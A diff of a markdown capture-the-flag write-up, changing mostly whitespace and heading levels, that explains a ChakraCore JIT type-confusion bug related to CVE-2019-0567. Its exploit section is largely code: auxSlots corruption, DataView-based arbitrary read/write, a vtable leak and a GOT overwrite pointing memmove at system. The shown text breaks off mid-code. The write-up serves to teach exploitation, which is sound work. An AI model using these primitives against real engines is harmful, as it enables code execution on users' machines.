@@ -17,12 +17,12 @@ If you already know the details of this challenge and bug, you can skip to the `
 
 Due to all the materials published about Javascript engines exploitation, recently I have been trying more browser exploitation challenges.
 
-# The challenge
+## The challenge
 
 We are given two binaries
 
 1. ch - which takes a null terminated javascript source file from stdin, writes it into a tmp directory and then executes it
-2. libChakraCore.so - a compiled version of [ChakraCore](https://github.com/microsoft/ChakraCore), a javascript engine from Microsoft 
+2. libChakraCore.so - a compiled version of [ChakraCore](https://github.com/microsoft/ChakraCore), a javascript engine from Microsoft
 
 We are also given a .diff file
 
@@ -33,7 +33,7 @@ index 88bf72d32..6fcb61151 100644
 +++ b/lib/Backend/GlobOptFields.cpp
 @@ -564,7 +564,7 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo
          break;
- 
+
      case Js::OpCode::InitClass:
 -    case Js::OpCode::InitProto:
 +    //case Js::OpCode::InitProto:
@@ -44,7 +44,7 @@ index 88bf72d32..6fcb61151 100644
 
 So the organizers have disabled a case in a function called ProcessFieldKills
 
-# The bug
+## The bug
 
 Searching for Chakra InitProto on google we can find several CVE.
 One of them is CVE-2019-0567 reported by lokihardt from Google Security who is also the author of this PoC
@@ -77,19 +77,19 @@ function main() {
 main();
 ```
 
-If you feed the PoC into the challenge binary you'll get a SegFault before the print function terminates when libChakraCore.so tries to access [rax] with rax = 0x100...1234 
+If you feed the PoC into the challenge binary you'll get a SegFault before the print function terminates when libChakraCore.so tries to access [rax] with rax = 0x100...1234
 
 (the 0x1 is used to differentiate numbers from pointers)
 
-lokihardt explains that if we set `proto` as the prototype of `tmp`, `proto`'s layout in memory changes. 
+lokihardt explains that if we set `proto` as the prototype of `tmp`, `proto`'s layout in memory changes.
 
 The jit compiler didn't take this side effect into account at the time.
 
 The challenge is basically a revert of the fixes that Microsoft applied.
 
-# Useful Reading
+## Useful Reading
 
-So to understand this issue a little bit better I read some general ChakraCore exploitation material such as 
+So to understand this issue a little bit better I read some general ChakraCore exploitation material such as
 
 - [Bruno Keith Presentation on the subject](https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler)
 
@@ -120,7 +120,7 @@ CVE-2019-0539 is a sibling bug of the one in the challenge, specifically the Ini
 // object. The offset of the inline slots is managed by DynamicTypeHandler.
 ```
 
-At the start, argument `proto` in `opt(o, proto, value)` has memory layout #3, setting it as a prototype makes it transition to layout #1 
+At the start, argument `proto` in `opt(o, proto, value)` has memory layout #3, setting it as a prototype makes it transition to layout #1
 
 (in the different bug discussed by Bruno Keith, the transition is #3 -> #2 so there are some differences wrt offsets)
 
@@ -140,7 +140,7 @@ The second ArrayBuffer is used to read from or write into the address that we wa
 
 You can refer to the slides and the second blog post for a more detailed explaination.
 
-# Exploit
+## Exploit
 
 I'll divide the exploit in three parts (Setup, Arbitrary address read and write, Code Execution) and explain a bit what each stage does
 
@@ -187,11 +187,11 @@ function main() {
     }
 
     let o = {a: 1, b: 2};
-  
+
     opt(o, o, obj); // o->auxSlots = obj (Step 1)
 
-    /* 
-      chqmatteo: so we set o.c but it can be any name you want, 
+    /*
+      chqmatteo: so we set o.c but it can be any name you want,
       it's just the third property of o
       so it will get written to o->auxSlots[2]
       similary obj.h is the 8th property of obj so we will write to obj->auxSlots[7]
@@ -199,7 +199,7 @@ function main() {
      */
     o.c = dv1; // obj->auxSlots = dv1 (Step 2)
     obj.h = dv2; // dv1->buffer = dv2 (Step 3)
-    
+
 ```
 
 ## Arbitrary address read and write
@@ -212,7 +212,7 @@ Here we set `dv1->buffer` to any address that we need
         // chqmatteo: 0x38 = 7 * 8, we are writing at ((void*)dv1->buffer)[7] which is dv2->buffer
         dv1.setUint32(0x38, addr_lo, true);
         dv1.setUint32(0x3C, addr_hi, true);
-        
+
         // read from addr (Step 5)
         return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
     }
@@ -220,26 +220,26 @@ Here we set `dv1->buffer` to any address that we need
         // dv2->buffer = addr (Step 4)
         dv1.setUint32(0x38, addr_lo, true);
         dv1.setUint32(0x3C, addr_hi, true);
-        
+
         // read from addr (Step 5)
         return [dv2.getInt32(0, true), dv2.getInt32(4, true)];
     }
-    
+
     let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
         // dv2->buffer = addr (Step 4)
         dv1.setUint32(0x38, addr_lo, true);
         dv1.setUint32(0x3C, addr_hi, true);
-        
+
         // write to addr (Step 5)
         dv2.setInt32(0, value_lo, true);
         dv2.setInt32(4, value_hi, true);
     }
-    
+
     // chqmatteo: the first value of the object is the pointer to the vtable
     vtable_lo = dv1.getUint32(0, true);
     vtable_hi = dv1.getUint32(4, true);
     print(hex(vtable_lo + vtable_hi * BASE));
-    
+
     // chqmatteo: demonstrate arbitrary read
     print(hex(read64(vtable_lo, vtable_hi)));
 ```
@@ -253,7 +253,7 @@ Now we can:
 1. read and write any address we want using from `dv2`
 2. plus we can read and write everything in the metadata of `dv2` using `dv1`.
 
-One thing that is useful from the metadata of `dv2` is the `vtable` pointer. 
+One thing that is useful from the metadata of `dv2` is the `vtable` pointer.
 
 The `vtable` pointer points to an address inside libChakraCore.so.
 That is we can compute the base address of the library leaking the vtable pointer and reading from that address.
@@ -274,20 +274,20 @@ The nice thing of `memmove` is that the first argument is a string and is the de
 So I overwrote the corresponding entry in got with the address of system.
 
 ```javascript
-    // compute some useful offsets, just try them all until it works    
+    // compute some useful offsets, just try them all until it works
     let gdb_base = 0xc3a52000; // libChakraCore.so base addr in gdb
-    
+
     let vptr_off = 0xc48566e0 - gdb_base;
     let chackra_base_lo = vtable_lo - vptr_off;
-    
+
     let malloc_got = 0xc48a56e0 - gdb_base;
     // write targets
     let free_got = 0xc48a5128 - gdb_base
     let memmove = free_got - 0x128 + 0x108
     let memset = free_got - 0x128 + 0x248
-        
+
     let one_gadget = 0x4f440; // actually it's system because the one gadgets that I tried didn't work
-    
+
     print(hex(chackra_base_lo + vtable_hi * BASE));
     print('malloc and free')
     // get libc offsets to find libc version
